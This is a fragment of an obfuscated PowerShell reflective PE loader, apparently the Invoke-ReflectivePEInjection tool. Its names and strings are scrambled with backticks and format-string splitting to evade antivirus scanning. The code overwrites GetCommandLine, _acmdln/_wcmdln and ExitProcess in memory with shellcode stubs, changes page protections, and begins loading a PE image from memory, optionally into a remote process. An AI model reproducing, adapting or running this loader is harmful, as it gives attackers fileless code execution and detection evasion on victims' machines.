		[Parameter(positIoN = 1, mAndaToRY = ${TR`Ue})]
		[System.Object]
		${win`32`Functi`O`Ns},
		
		[Parameter(poSItiOn = 2, manDaTorY = ${T`RUE})]
		[System.Object]
		${wiN`32`CONsTaNts},
		
		[Parameter(pOSITIOn = 3, mAnDatOrY = ${t`RuE})]
		[String]
		${exEaR`GUme`Nts},
		
		[Parameter(POSITioN = 4, maNdaToRY = ${TR`UE})]
		[IntPtr]
		${exed`oN`E`BYtep`TR}
		)
		
		
		${Re`T`URnaRr`Ay} = @() 
		
		${p`TrSi`zE} =  (childiTem vaRIaBLE:lisM5T ).vALUE::"sI`zEOf"([Type][IntPtr])
		[UInt32]${O`LdPRO`TEct`FlAg} = 0
		
		[IntPtr]${K`e`RnEL3`2haND`lE} = ${W`in`32`F`UNCtiOnS}."GE`TModUL`EHA`NdLE"."inv`OKe"(("{2}{0}{1}" -f'el32.dl','l','Kern'))
		if (${ke`RN`El32Ha`NdLE} -eq   (ChIldItEM  ('VaRIAb'+'LE:8Z'+'H')  ).valUE::"Z`eRO")
		{
			throw ("{0}{1}{3}{2}"-f'K','ern','handle null','el32 ')
		}
		
		[IntPtr]${K`E`RNe`l`BAseHA`NDLE} = ${WI`N32`FU`NcTi`Ons}."geTMoDul`eh`AND`le"."i`Nvo`Ke"(("{3}{2}{1}{0}" -f 'dll','ase.','nelB','Ker'))
		if (${keRneL`Ba`SEH`ANdLe} -eq  ( gci ('VarI'+'aB'+'lE:8zh')  ).vAluE::"z`ERO")
		{
			throw ("{4}{0}{1}{6}{3}{2}{5}" -f'er','nelBase ','dle nul','an','K','l','h')
		}

		
		
		
		${Cmdl`in`Ewa`RgSPTr} =   (gEt-VariAblE  lisM5t  -vaLue)::("{4}{3}{2}{0}{1}{5}"-f'gT','oHGlobalU','n','ri','St','ni').Invoke(${eX`E`ARGUM`ENTS})
		${cm`dLiNE`A`A`Rgs`PtR} =  (  gCi  vARIABLe:LISM5T  ).valUe::("{4}{0}{2}{3}{5}{1}"-f'i','balAnsi','ngTo','HGl','Str','o').Invoke(${E`xEARgUm`e`NTS})
	
		[IntPtr]${Ge`TCo`Mm`ANDLinEa`ADDr} = ${win3`2FUnCtIo`Ns}."geTPR`o`Cad`D`REsS"."i`NvOkE"(${KErnElB`As`E`hAnDlE}, ("{2}{3}{4}{0}{1}" -f'in','eA','GetC','omman','dL'))
		[IntPtr]${geTCO`mma`NdLIneWAD`DR} = ${wIN32FU`N`c`T`Ions}."gET`PR`ocAD`dre`Ss"."IN`VO`Ke"(${kERNEL`BaS`ehA`NdLe}, ("{3}{2}{1}{0}" -f'W','ne','etCommandLi','G'))

		if (${ge`T`co`mmAN`Dli`NEAaDdR} -eq   ( VAriaBLE  8zH  ).Value::"Z`ERO" -or ${get`cOMMA`ND`linEWAdDr} -eq   (  VarIAblE  8Zh  -VaLU )::"Z`ErO")
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr) "
		}

		
		[Byte[]]${sH`e`LlCO`DE1} = @()
		if (${pTr`SI`ZE} -eq 8)
		{
			${sH`E`LlC`odE1} += 0x48	
		}
		${Shell`C`oDe1} += 0xb8
		
		[Byte[]]${SH`el`l`CODE2} = @(0xc3)
		${Tot`ALsi`zE} = ${ShE`L`LCO`DE1}."LENg`Th" + ${PTR`SIZe} + ${Sh`ElLCOd`E2}."LEn`GtH"
		
		
		
		${g`e`TCOMMAndlI`Ne`AOriG`BytesPTr} =   ${L`iSm5t}::("{3}{0}{2}{1}" -f'ocH','al','Glob','All').Invoke(${t`oTA`lSI`ze})
		${g`etcOMM`A`NDlinEw`oRIgBYT`ES`Ptr} =   ( get-VariaBlE LIsM5t).VaLue::("{1}{0}{2}"-f 'HGlo','Alloc','bal').Invoke(${TO`Ta`l`SIzE})
		${w`IN32`FUN`CTIOns}."M`EmCPy"."IN`Voke"(${G`e`Tcom`ManDLINeAORIGByteS`PTR}, ${g`EtcOmm`An`dL`IN`EAaddr}, [UInt64]${T`OtAl`S`Ize}) | &("{1}{0}{2}" -f'N','Out-','ull')
		${win`32fuNCTi`O`Ns}."ME`M`CpY"."I`NvO`Ke"(${GETcO`mmAND`L`iNEwOrIGby`TE`SptR}, ${getCoMM`ANd`lInewA`DDR}, [UInt64]${t`o`TAl`siZe}) | &("{0}{2}{1}"-f'Out','ll','-Nu')
		${ReTu`R`NAR`RAY} += ,(${g`eTc`O`mmaNdLI`NEa`ADdr}, ${g`ETc`O`MmaNDLiNEAor`Igby`T`E`SpTR}, ${tO`TAlsI`ZE})
		${Return`A`RR`AY} += ,(${gEtC`OmM`A`NdL`iNEWaDdR}, ${ge`TCoM`m`A`NdlINEWORIG`BYT`eSPtR}, ${to`T`AlsIZE})

		
		[UInt32]${O`ldproTe`ct`FlAg} = 0
		${sU`cc`esS} = ${w`In32`FUNCT`IO`NS}."v`irtuaL`prOT`ect"."INv`OkE"(${gETcom`mANd`li`NEaaD`Dr}, [UInt32]${TO`TALs`IzE}, [UInt32](${WIN32`CO`NSta`N`Ts}."Pa`GE_e`xeCUTe_REa`dWRite"), [Ref]${oL`DproTEc`TFl`AG})
		if (${su`c`cESs} = ${Fa`l`SE})
		{
			throw ("{1}{2}{3}{4}{8}{5}{6}{0}{7}" -f 'l','Ca','ll to V','irtu','a','r','otect fai','ed','lP')
		}
		
		${g`E`TcO`mmANDl`i`NE`AA`DDrTEMP} = ${G`ETc`OMMaN`DL`iNeaAddr}
		&("{3}{0}{1}{2}{4}"-f 'B','ytesT','oMem','Write-','ory') -Bytes ${ShEL`Lco`de1} -MemoryAddress ${getcomMa`N`dliNEaADD`RTE`Mp}
		${GeTcomma`NDLIn`eaa`ddr`T`eMp} = &("{2}{5}{4}{1}{0}{6}{3}" -f 'dI','e','A','tAsUnsigned','-Sign','dd','n') ${ge`TcO`MMA`N`DLINEa`ADDR`TEmP} (${sHel`l`cOd`E1}."Le`Ngth")
		 ${L`isM`5t}::("{0}{4}{3}{2}{1}"-f 'S','Ptr','reTo','tu','truc').Invoke(${CMDl`INeAa`RGsP`Tr}, ${gETCOM`mANdL`I`NeAA`d`dRtemP}, ${F`ALSE})
		${gEtcommaND`Li`NEaadD`RT`eMp} = &("{0}{5}{2}{4}{3}{1}" -f 'Add-SignedI','ned','Un','g','si','ntAs') ${g`et`CO`mma`ND`LineaADdRT`EMP} ${PtRsi`Ze}
		&("{4}{0}{2}{3}{1}{6}{5}" -f 'ite-Byt','Mem','es','To','Wr','y','or') -Bytes ${s`HELlcO`DE2} -MemoryAddress ${GeTCoM`mandL`I`NEA`A`ddrTemp}
		
		${W`in3`2FUNctIO`Ns}."VirT`U`ALP`ROTEct"."in`VoKe"(${geTC`o`mma`Nd`L`i`NEaaDdR}, [UInt32]${t`otal`sI`ZE}, [UInt32]${old`PrO`TEct`FLAg}, [Ref]${O`L`dpROT`ec`TFlaG}) | &("{1}{0}"-f'ut-Null','O')
		
		
		
		[UInt32]${ol`D`prOt`ECTF`Lag} = 0
		${SuC`C`eSS} = ${Wi`N32F`UnCt`iONS}."VI`Rt`U`ALpRo`TECt"."I`NVO`KE"(${G`eTcO`mm`AndliNe`WADdR}, [UInt32]${tOtALs`I`ze}, [UInt32](${WiN32`co`N`stanTs}."pAg`E_eX`eCute_Rea`dWrI`Te"), [Ref]${olDPR`ote`ct`F`LAG})
		if (${Succe`Ss} = ${F`ALSe})
		{
			throw ("{6}{4}{1}{5}{2}{0}{7}{3}"-f'Protect f','l to','l','iled','l',' Virtua','Ca','a')
		}
		
		${GetcOMM`A`N`dlINE`WA`DdRteMp} = ${GeTco`MmANdlI`N`eWa`ddr}
		&("{2}{4}{3}{0}{1}"-f 'r','y','Write-Byte','oMemo','sT') -Bytes ${SHeL`lCO`de1} -MemoryAddress ${G`eTcOMmaN`dl`inE`WAD`DRT`eMp}
		${G`ETcOmM`An`DLInewAd`Dr`TEmp} = &("{0}{4}{1}{3}{2}" -f 'A','e','tAsUnsigned','dIn','dd-Sign') ${GEt`CO`mM`AnDlINEW`ADDrt`eMp} (${S`HEllC`oD`E1}."L`e`NGtH")
		 ${L`is`M5t}::("{2}{1}{0}"-f 'Ptr','To','Structure').Invoke(${Cm`dl`iNEWa`RGS`pTr}, ${getco`MMANd`LiNeW`ADdrTe`mP}, ${fa`l`se})
		${GeTCOM`mAndLI`Newa`d`dRtemP} = &("{2}{4}{6}{1}{5}{3}{0}" -f'd','ntAsUnsi','Add-S','e','ign','gn','edI') ${GEtcOmm`A`N`dlINEWAdDrtE`mP} ${PtrSI`ze}
		&("{3}{0}{1}{4}{5}{2}{6}" -f'i','t','Memor','Wr','e-','BytesTo','y') -Bytes ${ShE`llcoD`E2} -MemoryAddress ${G`E`TcomM`A`NdLin`EwadDRT`Emp}
		
		${wIn32FuN`c`Ti`ons}."viRtUa`lproT`ECt"."IN`VoKe"(${G`e`TcoMm`An`dLIneWAdDr}, [UInt32]${toT`A`LSI`ZE}, [UInt32]${OldPr`O`TE`CTFLag}, [Ref]${oLdP`Ro`T`EcTFLAG}) | &("{1}{0}{2}"-f'-N','Out','ull')
		
		
		
		
		
		
		
		
		${D`lLList} = @(("{3}{2}{1}{0}"-f '0d.dll','r7','svc','m'), ("{2}{1}{0}"-f 'll','r71d.d','msvc'), ("{2}{0}{1}" -f'svcr80','d.dll','m'), ("{1}{3}{2}{0}"-f'll','msvcr','.d','90d'), ("{1}{2}{0}"-f'r100d.dll','msv','c'), ("{3}{2}{0}{1}"-f '.','dll','d','msvcr110'), ("{1}{2}{3}{0}"-f 'll','msvcr70','.','d') `
			, ("{0}{2}{1}"-f 'msvcr7','l','1.dl'), ("{0}{3}{1}{2}"-f'ms','cr80','.dll','v'), ("{0}{3}{2}{1}" -f 'ms','90.dll','cr','v'), ("{1}{0}{3}{2}"-f 'v','ms','00.dll','cr1'), ("{2}{1}{0}" -f 'l','l','msvcr110.d'))
		
		foreach (${d`Ll} in ${d`llL`IST})
		{
			[IntPtr]${Dllh`A`N`DLe} = ${WIN`3`2F`UnCti`OnS}."ge`TMO`d`UlehandlE"."Inv`oKe"(${D`lL})
			if (${DlLH`An`DLE} -ne  (Ls  VARIaBlE:8zh  ).vaLuE::"z`ErO")
			{
				[IntPtr]${wcM`DLNA`d`DR} = ${WIn`32fUNc`TI`o`Ns}."g`eTPROCaDDR`E`ss"."i`Nv`OkE"(${Dll`hAN`Dle}, ("{1}{2}{0}"-f'ln','_w','cmd'))
				[IntPtr]${A`cmdLN`AddR} = ${WIn32F`U`NctionS}."gE`TPRoCA`D`dresS"."in`VokE"(${D`l`LHandle}, ("{0}{1}" -f '_a','cmdln'))
				if (${wC`mDlN`AdDr} -eq   (cHIldITEM  ("vaRiAB"+"lE:8"+"Z"+"h") ).ValUE::"ze`Ro" -or ${aCMdl`N`ADDr} -eq  ${8`Zh}::"z`ERo")
				{
					((("{4}{1}{6}{7}{0}{3}{10}{2}{11}{5}{8}{9}" -f't ','or, cou','wcmdln ','find','Err',' _acmd','ldn','z7T','l','n',' _','or'))."RePla`Ce"('z7T',[StrINg][cHar]39))
				}
				
				${nEwa`C`M`DlnP`Tr} =  (  ItEM vARiabLE:lism5T  ).ValUE::("{2}{4}{1}{3}{0}" -f 'si','T','Stri','oHGlobalAn','ng').Invoke(${eXE`A`RG`UmE`NTs})
				${NeW`w`C`MdLnpTr} =  ( GeT-vaRIAbLe  ("L"+"ISm5"+"T") ).VaLUe::("{3}{2}{1}{5}{0}{4}"-f'Un','Glo','H','StringTo','i','bal').Invoke(${ex`EARGu`MeN`Ts})
				
				
				${ORI`GACM`DL`NpTR} =   ${LI`s`M5t}::"ptr`TOSTRu`cT`U`Re"(${acMDl`N`ADDr}, [Type][IntPtr])
				${O`R`iGWc`mdlnptR} =  ( iTeM ('vAri'+'AbLE'+':LiSm5'+'T')).VAlue::"p`T`RT`osTrUCturE"(${wc`mdL`Na`ddR}, [Type][IntPtr])
				${o`RigaC`MDlnpt`RstORA`ge} =  ${LIsm`5T}::("{3}{0}{1}{2}" -f 'HGl','ob','al','Alloc').Invoke(${PtR`S`izE})
				${OR`IGW`C`MDlNptR`StOR`Age} =   ${lis`m`5T}::("{2}{1}{0}{3}"-f'HGloba','loc','Al','l').Invoke(${P`TrSI`zE})
				  (  VARIable ('L'+'IsM5'+'T')  ).vALUE::("{2}{1}{0}{3}"-f'uctureToP','tr','S','tr').Invoke(${origA`c`MD`LNPTr}, ${oRig`Acm`DlnPt`RsTOr`AgE}, ${f`A`Lse})
				 (GEt-ITem ('V'+'A'+'Ri'+'ABLE:LIs'+'M5t')).VALUe::("{4}{2}{1}{3}{0}" -f'tr','e','ructur','ToP','St').Invoke(${O`RigWCmd`lNptr}, ${o`RI`G`W`CmDLNpTRSTorA`Ge}, ${fA`lSE})
				${ret`UrnA`R`Ray} += ,(${a`cMd`l`NaDdR}, ${OrIg`A`CMD`LnptrsTora`ge}, ${p`T`RsiZE})
				${r`ETUr`Na`Rray} += ,(${WC`M`dL`Naddr}, ${o`R`i`gWC`mdlN`ptRStoRaGE}, ${ptrs`iZE})
				
				${sUccE`sS} = ${wIN32F`UNc`TioNS}."v`Ir`TUAl`PRoTeCT"."I`NvO`KE"(${AcM`DLNaD`DR}, [UInt32]${Pt`R`SiZe}, [UInt32](${w`In32Cons`T`Ants}."Pa`G`E_Ex`eCU`TE_ReadWRiTe"), [Ref]${o`LDpRote`CTFLAg})
				if (${sUcCe`SS} = ${FaL`sE})
				{
					throw ("{5}{1}{4}{3}{0}{2}"-f 'a',' Virtua','iled','ect f','lProt','Call to')
				}
				  (  gi ('VArIAbLe:LI'+'sm'+'5t')).vALue::("{3}{2}{0}{1}" -f'reToP','tr','ctu','Stru').Invoke(${N`EWACMd`Lnptr}, ${a`cm`dlNAd`DR}, ${F`ALSE})
				${Win32`Fu`NctiONs}."virt`U`A`LPROT`EcT"."inVO`Ke"(${aC`MDlna`d`dr}, [UInt32]${PT`RS`Ize}, [UInt32](${ol`DP`ROtEC`TFLaG}), [Ref]${o`l`DPrOtE`cTFlAg}) | &("{0}{2}{1}" -f 'Ou','ull','t-N')
				
				${Suc`Ce`Ss} = ${wIN32FUnC`Ti`ons}."VIr`T`UA`l`prOtECt"."INVO`KE"(${wcMdln`Ad`Dr}, [UInt32]${PT`RsIze}, [UInt32](${W`in`3`2c`oNStaNTS}."PAg`e_e`xeCUtE_REa`dW`RiTe"), [Ref]${OlDp`R`OtEC`T`FlaG})
				if (${S`Ucce`SS} = ${F`AlSE})
				{
					throw ("{6}{0}{4}{1}{2}{5}{3}" -f 'to','Virtua','lProt','ct failed',' ','e','Call ')
				}
				 ${lIS`M5t}::("{3}{1}{2}{0}" -f 'Ptr','ctur','eTo','Stru').Invoke(${NeW`WCM`D`LNptR}, ${wCmd`lna`Ddr}, ${fA`lse})
				${WIn32f`U`NCt`IONs}."VI`Rtua`lpRO`TeCt"."I`NvOkE"(${wC`MD`Ln`ADdR}, [UInt32]${ptr`s`IZe}, [UInt32](${O`lDpr`OTeCtF`lag}), [Ref]${oLDPrO`Te`c`TfL`Ag}) | &("{2}{1}{0}"-f'Null','ut-','O')
			}
		}
		
		
		
		
		

		${R`etURN`ARraY} = @()
		${ExiTfUn`CT`I`o`Ns} = @() 
		
		
		[IntPtr]${MsC`O`R`Eeh`ANdLe} = ${WIN3`2`F`UNCTIoNS}."g`etmODUlEHa`N`dLe"."IN`VoKe"(("{0}{1}{2}"-f 'ms','coree.dl','l'))
		if (${Ms`COrEeH`ANDle} -eq   (GET-varIabLe  ('8z'+'H')  -vA)::"Z`Ero")
		{
			throw ("{4}{3}{0}{1}{2}" -f 'e',' ha','ndle null','score','m')
		}
		[IntPtr]${cOrE`XITPr`ocE`S`s`ADDR} = ${W`in32F`UNCtio`Ns}."GeTPrO`CA`DdRESS"."iNV`oKe"(${MScOr`ee`HAn`D`lE}, ("{4}{3}{0}{2}{1}" -f 'itPro','s','ces','Ex','Cor'))
		if (${C`O`Rex`i`TPROcessADDr} -eq  ${8`Zh}::"Z`ERo")
		{
			Throw ("{5}{8}{3}{1}{4}{6}{0}{7}{9}{2}" -f ' f','d','d','ss a','dr','CorEx','ess not','o','itProce','un')
		}
		${EX`ITFUnCT`I`oNs} += ${c`o`REXITPROCeSSa`DdR}
		
		
		[IntPtr]${eX`ItPRoCESSa`d`dR} = ${W`In`32fu`NcTIONS}."G`etPrO`c`ADDR`eSS"."i`NVOkE"(${K`ERne`L3`2hAnDLe}, ("{1}{0}{3}{2}" -f 'xitProc','E','ss','e'))
		if (${EX`ITp`Ro`CEssa`ddr} -eq  ${8`zh}::"Z`ERo")
		{
			Throw ("{4}{3}{0}{5}{2}{1}" -f 'dress ','und','t fo','ad','ExitProcess ','no')
		}
		${e`xitfUNcTio`NS} += ${eXITP`R`oCeSsA`DDr}
		
		[UInt32]${O`L`DpRO`T`EcTfLAG} = 0
		foreach (${p`Ro`CexI`T`Fu`NctionaDDr} in ${e`xitFuncT`I`ons})
		{
			${P`R`oceX`iTfUN`CtioN`A`ddRtmp} = ${Pr`ocexIt`FunC`TiON`A`ddR}
			
			
			[Byte[]]${sHElLC`o`dE1} = @(0xbb)
			[Byte[]]${SHe`LL`C`ODe2} = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			
			if (${P`TrS`iZe} -eq 8)
			{
				[Byte[]]${SHE`l`LC`OdE1} = @(0x48, 0xbb)
				[Byte[]]${SH`el`lC`OdE2} = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]${s`h`EllcOde3} = @(0xff, 0xd3)
			${tO`TalSI`ZE} = ${SH`ELLc`ODe1}."LEN`Gth" + ${Pt`R`SiZE} + ${she`lLco`DE2}."le`Ngth" + ${P`TRsizE} + ${ShelL`CO`D`E3}."lEN`g`TH"
			
			[IntPtr]${eXITt`hRe`Ad`ADdR} = ${w`iN32`FunCTio`Ns}."GETpR`Oca`DdR`E`SS"."i`NVoke"(${Ke`R`NeL32HA`Nd`le}, ("{2}{1}{0}"-f 'hread','T','Exit'))
			if (${eXItt`hr`EA`D`Addr} -eq   (GEt-CHILdIteM ("Va"+"riAb"+"le:8Zh")).Value::"z`ERO")
			{
				Throw ("{4}{2}{3}{5}{8}{1}{7}{0}{6}"-f 'u','ot ','T','hread ad','Exit','dres','nd','fo','s n')
			}

			${S`Uc`cEss} = ${w`in32f`Un`cTIONs}."v`IRTuAlp`RoT`ecT"."InV`oke"(${pr`ocExi`TfUncTi`ONAd`dR}, [UInt32]${t`oTALS`ize}, [UInt32]${wIn3`2cO`N`ST`AntS}."page_ExECUTe_`R`eaDW`Ri`Te", [Ref]${olDpROTeC`T`F`Lag})
			if (${s`UCCE`SS} -eq ${Fa`lSe})
			{
				Throw ("{5}{4}{0}{1}{2}{3}" -f'alPr','ote','ct ','failed','l to Virtu','Cal')
			}
			
			
			${EXIT`PrOCesSOrIGb`y`T`EspTR} =   ( Gi vaRIablE:lism5t).vaLUE::("{0}{3}{2}{1}"-f 'Allo','al','lob','cHG').Invoke(${tOTalS`i`ze})
			${Wi`N32fuNC`Ti`O`Ns}."M`EMCpy"."i`N`VokE"(${Ex`i`TpR`oC`ESsO`Ri`GbYteSPtr}, ${Procexitfu`NCti`o`NA`DDR}, [UInt64]${TO`T`ALsiZe}) | &("{2}{1}{0}" -f'l','ut-Nul','O')
			${REtURNA`R`RaY} += ,(${p`ROCEx`iT`F`UNCtIon`AdDR}, ${ex`ITpRO`CEsSO`RIGBy`T`Es`PtR}, ${TO`T`AlSIZe})
			
			
			
			&("{6}{2}{5}{1}{0}{4}{3}"-f 'm','Me','rite','ry','o','-BytesTo','W') -Bytes ${SHe`L`lCod`E1} -MemoryAddress ${p`R`o`cE`XItfunctIONA`d`DRtMP}
			${P`ROceXi`T`FUNcT`IONaDdr`T`MP} = &("{5}{3}{0}{2}{1}{4}{6}" -f'n','sig','edIntAsUn','Sig','n','Add-','ed') ${ProCE`xi`TFUn`cTIONaDDr`TmP} (${S`hELlCo`De1}."l`eNGTH")
			  (DIR ("varIAb"+"Le"+":lIS"+"m"+"5t") ).VALUE::("{4}{1}{3}{2}{0}" -f'r','ru','Pt','ctureTo','St').Invoke(${e`xeDoN`ebYTEPTR}, ${P`ROceX`I`Tf`UnCTi`Onadd`RtMP}, ${fa`l`Se})
			${PR`OcEXiT`FUNCTi`ON`ADdrtMP} = &("{5}{0}{4}{1}{3}{2}"-f 'edInt','nsi','d','gne','AsU','Add-Sign') ${pr`Oc`eX`IT`FuN`cTIoNA`DdrtmP} ${p`TrsI`zE}
			&("{3}{1}{2}{0}"-f'emory','tesT','oM','Write-By') -Bytes ${ShE`LlcO`de2} -MemoryAddress ${pR`Oc`E`xiTF`Un`Ct`IOna`DdRTmP}
			${prO`CEXI`TFUNCti`o`N`AddrTMp} = &("{4}{3}{0}{1}{2}"-f'ntAsUnsig','n','ed','dI','Add-Signe') ${p`Ro`c`eXI`TFUnctiOna`ddRTMp} (${S`hEL`lCoDe2}."lEnG`Th")
			 (  VARiAbLe Lism5t  -vAlu  )::("{0}{2}{1}"-f'StructureToP','r','t').Invoke(${EXit`Th`ReaDad`Dr}, ${PR`oCeX`itF`UnCTIoNAD`DRT`MP}, ${fA`L`SE})
			${P`RoC`ex`iTfunCTIOnaDdR`TmP} = &("{6}{5}{3}{0}{2}{4}{1}"-f'Sign','AsUnsigned','edIn','d-','t','d','A') ${PRo`cE`XitFunCtion`A`d`dRtmP} ${ptrs`I`zE}
			&("{3}{1}{4}{2}{0}"-f'esToMemory','-','t','Write','By') -Bytes ${Sh`ELLc`ODE3} -MemoryAddress ${PrO`CeXI`T`FuN`cT`IoNadDRt`mp}

			${Wi`N32Fu`NCtiO`Ns}."VI`Rt`UA`lPROtecT"."In`VoKE"(${prOcE`x`I`TfU`N`CtIonaDDr}, [UInt32]${ToT`A`lSizE}, [UInt32]${old`PrO`TeCTF`lAG}, [Ref]${oLDpR`oTE`c`Tfl`AG}) | &("{0}{2}{1}"-f'O','-Null','ut')
		}
		

		&("{1}{3}{0}{2}" -f'-O','Wr','utput','ite') ${RetuR`N`Arr`AY}
	}
	
	
	
	
	Function Cop`Y`-ArrAyo`FMeMadDR`essES
	{
		Param(
		[Parameter(poSiTIoN = 0, mAnDaToRY = ${tR`UE})]
		[Array[]]
		${c`OpyI`NFo},
		
		[Parameter(POsITiON = 1, mAndaTOry = ${T`Rue})]
		[System.Object]
		${wIN32FunC`T`IO`NS},
		
		[Parameter(pOSition = 2, mandAtory = ${Tr`UE})]
		[System.Object]
		${w`in3`2C`oNst`ANts}
		)

		[UInt32]${O`L`DPr`ote`CtFlAG} = 0
		foreach (${i`NFo} in ${c`Opy`Info})
		{
			${sU`C`CeSS} = ${WIN32fu`N`CT`iONS}."Vi`RTua`lPR`otE`ct"."IN`VO`kE"(${I`NFO}[0], [UInt32]${I`NFO}[2], [UInt32]${WIN32Co`Ns`TAntS}."PAgE_Ex`E`C`U`T`E_R`eAdWRItE", [Ref]${O`LDP`ROTEC`TfLAg})
			if (${S`UccesS} -eq ${f`ALsE})
			{
				Throw ("{4}{6}{1}{5}{3}{0}{2}"-f 'l','Protect ','ed','i','Call to Vi','fa','rtual')
			}
			
			${W`iN32f`UnCTI`OnS}."Me`mcpY"."in`VoKe"(${IN`FO}[0], ${In`Fo}[1], [UInt64]${i`NfO}[2]) | &("{0}{1}"-f'Out-N','ull')
			
			${WiN3`2fu`NCT`io`Ns}."Virtual`P`Ro`T`eCt"."I`NvOKe"(${I`Nfo}[0], [UInt32]${in`FO}[2], [UInt32]${o`lDp`ROt`ecT`FlaG}, [Ref]${oldpr`O`TECT`FlaG}) | &("{0}{1}" -f 'Out-Nu','ll')
		}
	}


	
	
	
	Function g`et-mem`oRY`PrOCa`dDREsS
	{
		Param(
		[Parameter(POSitioN = 0, MANdAtORY = ${T`RuE})]
		[IntPtr]
		${PEH`A`NDle},
		
		[Parameter(poSitioN = 1, manDATorY = ${t`RUE})]
		[String]
		${F`Unct`i`on`NaME}
		)
		
		${W`in`32tyPes} = &("{3}{4}{2}{1}{0}"-f 'ypes','in32T','-W','G','et')
		${wIn32CO`Ns`T`AntS} = &("{4}{2}{1}{5}{3}{0}"-f'nts','in32C','W','nsta','Get-','o')
		${PE`In`FO} = &("{0}{2}{1}{3}" -f 'Get-PEDet','dI','aile','nfo') -PEHandle ${P`Eh`AnDLE} -Win32Types ${w`iN`32tY`peS} -Win32Constants ${wI`N32CoNS`T`An`TS}
		
		
		if (${p`EinFo}."iMAGE_nT_HEA`D`E`Rs"."oPt`ionALh`E`ADER"."EX`poR`T`TAbLe"."sI`Ze" -eq 0)
		{
			return  (item vAriABlE:8zh ).vAluE::"z`ERo"
		}
		${e`XporTTAbleP`TR} = &("{1}{3}{4}{0}{2}"-f'Uns','Add-','igned','SignedIntA','s') (${PeH`A`N`Dle}) (${P`Ei`NFO}."imAGE_NT_h`eADe`RS"."Op`TIO`NALHE`AdeR"."eXpOR`TTa`BlE"."vI`RtUalAD`Dre`ss")
		${EXpOr`Ttab`Le} =   (  VariABLE  lISm5t -vAl )::"pTRto`S`T`RUcTUrE"(${E`XPoRt`TAble`ptr}, [Type]${WIn`3`2TyPes}."ImagE_exP`O`Rt_diR`e`cT`o`Ry")
		
		for (${i} = 0; ${I} -lt ${E`XP`or`TTablE}."Num`BEr`oF`Names"; ${I}++)
		{
			
			${nAmeO`F`FsETP`TR} = &("{2}{1}{3}{4}{0}"-f 'gned','-Si','Add','gned','IntAsUnsi') (${Pe`h`And`LE}) (${e`x`POrt`Table}."Add`REss`o`FNA`mEs" + (${i} *   ${L`IsM`5t}::"SIze`OF"([Type][UInt32])))
			${na`Mep`Tr} = &("{6}{1}{0}{3}{5}{2}{4}" -f 'A','gnedInt','signe','s','d','Un','Add-Si') (${PE`H`AnDlE}) ( ${l`I`sM5T}::"p`T`R`TostruCTuRE"(${NA`meOff`S`EtP`Tr}, [Type][UInt32]))
			${nA`mE} =  ( vARIAbLE lisM5T).vALUe::("{0}{3}{1}{2}"-f 'PtrToS','ring','Ansi','t').Invoke(${Nam`eP`TR})

			if (${N`Ame} -ceq ${fuNC`T`iO`N`NAme})
			{
				
				
				${or`diN`Al`PtR} = &("{1}{4}{0}{6}{5}{2}{3}"-f'Signe','A','tAsUnsi','gned','dd-','n','dI') (${pE`HAn`d`le}) (${e`xPoR`TtA`BLE}."AD`drESs`Of`NAMeOrDiNaLS" + (${I} *   (  Get-VARiabLe  LISm5t  ).value::"s`IZEOf"([Type][UInt16])))
				${FU`N`Cindex} =   ( ITEm  vaRIABlE:lIsm5t).valuE::"pTR`T`OSt`R`UcTURe"(${Or`Di`NA`lpTr}, [Type][UInt16])
				${Fu`Ncof`FSE`T`AdDr} = &("{4}{2}{0}{1}{5}{3}" -f 'g','ne','i','gned','Add-S','dIntAsUnsi') (${Peh`A`NDLe}) (${E`xpOR`Ttable}."adD`REsSoFfuNCT`i`onS" + (${f`U`NCInDEx} *   ${l`is`M5t}::"s`IZEoF"([Type][UInt32])))
				${funCOF`Fs`et} =  (  geT-variABle  ('li'+'Sm5T')).ValuE::"ptrtO`S`TRUCT`U`Re"(${fu`NcOfFse`Ta`dDr}, [Type][UInt32])
				return &("{0}{2}{1}{3}{6}{4}{5}"-f'Add-','edI','Sign','n','AsUnsign','ed','t') (${pEhA`ND`le}) (${FUncOF`F`sEt})
			}
		}
		
		return  ${8`zH}::"Z`ERO"
	}


	Function I`N`VOK`E-M`emo`RyLOa`D`lIbraRy
	{
		Param(
		[Parameter( posiTIOn = 0, MANdaToRY = ${t`RUe} )]
		[Byte[]]
		${P`eBYT`ES},
		
		[Parameter(poSitION = 1, manDatOrY = ${fa`lSE})]
		[String]
		${exE`ARGS},
		
		[Parameter(pOSITIoN = 2, maNDATorY = ${Fa`L`Se})]
		[IntPtr]
		${R`e`m`OTEpRocHAN`Dle},

        [Parameter(posItION = 3)]
        [Bool]
        ${fO`RC`EAslr} = ${Fa`l`Se}
		)
		
		${ptR`S`iZE} =   ${Li`sm5t}::"Si`zEoF"([Type][IntPtr])
		
		
		${W`In32co`NsT`AntS} = &("{0}{1}{3}{2}" -f 'Ge','t-Win3','nstants','2Co')
		${W`in32funC`TIOns} = &("{1}{3}{2}{0}" -f'tions','Get-Win3','c','2Fun')
		${w`i`N32`TYPeS} = &("{1}{0}{2}"-f'2Ty','Get-Win3','pes')
		
		${ReMo`TE`lO`ADi`NG} = ${Fa`l`sE}
		if ((${rE`mo`TEpr`och`ANDLe} -ne ${nu`LL}) -and (${ReMOT`e`pR`OCHa`NDlE} -ne  (vARIaBle  8Zh).vALUe::"zE`Ro"))
		{
			${rEmOtEL`OA`D`I`NG} = ${TR`Ue}
		}
		
		
		&("{3}{0}{1}{2}"-f'rb','os','e','Write-Ve') ("{0}{6}{4}{8}{7}{9}{2}{3}{5}{1}" -f 'Get','rom the file','E inf','o','i','rmation f','t','basi','ng ','c P')
		${peI`Nfo} = &("{2}{0}{1}{3}"-f't-PEBas','icInf','Ge','o') -PEBytes ${PE`By`TES} -Win32Types ${WIn32t`Y`p`es}
		${ORIg`I`NAlImAGeB`ASE} = ${PeI`NfO}."oRiG`I`NalIMaG`e`BaSE"
		${NxCO`M`PATible} = ${T`RuE}
		if ((${pE`I`Nfo}."dL`lChA`R`ActErIsT`ics" -band ${WIN32CO`N`s`TantS}."iM`AG`e_d`LLC`harACTERis`TIcS_nX`_cOM`pAT") -ne ${Win32C`o`NSt`ANTS}."I`Mage_`dLL`CHa`Ract`E`RISt`IC`S_n`x_cOMPaT")
		{
